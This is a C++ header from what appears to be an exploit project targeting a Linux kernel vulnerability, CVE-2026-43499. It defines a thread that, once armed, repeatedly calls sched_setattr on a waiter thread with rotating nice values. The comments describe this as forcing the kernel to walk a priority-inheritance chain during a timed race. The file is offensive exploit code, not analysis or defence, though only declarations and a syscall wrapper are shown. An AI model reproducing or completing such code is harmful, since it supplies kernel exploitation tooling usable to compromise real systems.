#pragma once
/** @file backend/cve_2026_43499/seam/multicast_consumer.hpp
 *  The third actor of the multicast handshake: the thread that makes the kernel walk the PI chain.
 *
 *  The retired consumer did one thing per call: sched_setattr on the waiter thread id, under
 *  SCHED_BATCH, with the nice value rotated, and counted a call every time and a success only when
 *  the syscall was accepted. That is the whole of it, and that is what this class is: a thread that
 *  waits to be armed, then issues one sched_setattr per burst until it is disarmed, reporting the
 *  two counts the handshake reads.
 *
 *  The retired file's own note says why the nice value rotates: it is what makes sched_setattr
 *  succeed on the target geometry, and a run that always used one value is not the same run. The
 *  modulus is therefore a construction parameter and not a constant here.
 *
 *  Lifetime: started and stopped by its owner. The waiter id is given after construction because the
 *  waiter is created by the same assembly that creates this.
 */
#include <cstdint>
#include <sched.h>
#include <sys/syscall.h>
#include <unistd.h>

#include <linux/sched.h>

namespace ghostlock::backend::cve_2026_43499::seam {
    /** The scheduling attributes one call sets. The layout is the kernel's. */
    struct SchedAttrPacket final {
        std::uint32_t size = 0U;
        std::uint32_t sched_policy = 0U;
        std::uint64_t sched_flags = 0U;
        std::int32_t sched_nice = 0;
        std::uint32_t sched_priority = 0U;
        std::uint64_t sched_runtime = 0U;
        std::uint64_t sched_deadline = 0U;
        std::uint64_t sched_period = 0U;
    };

    /** One sched_setattr, with the packet built here so the caller passes only what it chooses. */
    [[nodiscard]] inline long sched_setattr_nice(std::int32_t tid, std::int32_t nice_value,
                                                 std::uint32_t policy) noexcept {
        SchedAttrPacket packet{};
        packet.size = sizeof(SchedAttrPacket);
        packet.sched_policy = policy;
        packet.sched_nice = nice_value;
        errno = 0;
        return static_cast<long>(::syscall(SYS_sched_setattr, tid, &packet, 0U));
    }

    /** The consumer the handshake arms. Satisfies the route's MulticastConsumer concept. */
    class MulticastConsumerThread final {
      public:
        MulticastConsumerThread(std::int32_t nice_modulus, std::uint32_t policy) noexcept
            : nice_modulus_(nice_modulus), policy_(policy) {}

        MulticastConsumerThread(const MulticastConsumerThread &) = delete;
        MulticastConsumerThread &operator=(const MulticastConsumerThread &) = delete;
        ~MulticastConsumerThread() noexcept { stop(); }

        /** The thread id the calls aim at. Set once the waiter exists and before arming. */
        void set_target(std::int32_t tid) noexcept { target_ = tid; }

        /** Start the loop. One thread, owned here. */
        void start() noexcept;

        /** Ask the loop to return and join it. */
        void stop() noexcept;

        /** Arm for one round: the loop picks the new sequence up and issues calls for it. */
        void arm(std::int32_t attempt) noexcept { go_ = attempt; }

        /** End the current round without ending the thread. */
        void disarm() noexcept { go_ = 0; }

        [[nodiscard]] bool inflight() const noexcept { return inflight_ != 0; }
        [[nodiscard]] std::int32_t successes() const noexcept { return successes_; }
        [[nodiscard]] std::int32_t calls() const noexcept { return calls_; }
        /** The first errno the syscall reported, which is what says why it was refused. */
        [[nodiscard]] std::int32_t first_errno() const noexcept { return first_errno_; }

      private:
        void loop() noexcept;

        std::int32_t target_ = 0;
        std::int32_t nice_modulus_ = 0;
        std::uint32_t policy_ = 0U;
        volatile std::int32_t go_ = 0;
        volatile std::int32_t quit_ = 0;
        volatile std::int32_t inflight_ = 0;
        volatile std::int32_t calls_ = 0;
        volatile std::int32_t successes_ = 0;
        volatile std::int32_t first_errno_ = 0;
    };
}  // namespace ghostlock::backend::cve_2026_43499::seam
